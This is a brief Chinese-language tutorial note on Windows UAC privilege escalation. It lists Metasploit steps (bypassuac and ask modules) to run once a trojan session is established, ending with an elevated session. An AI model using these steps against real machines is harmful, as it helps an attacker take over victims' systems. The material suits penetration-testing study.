uac提权

UAC提权

两种方式

前提:

msfconsole 木马连接上后放入后台

方法一

  1. use exploit/windows/local/bypassuac
  2. show options ，set session
  3. run

方法二

  1. use exploit/windows/local/ask
  2. show options
  3. set session 1
  4. 在用户那输入用户密码就会建立连接
  5. 会发现新创建了个sessions
  6. 在新sessions中使用getuid进行查看权限
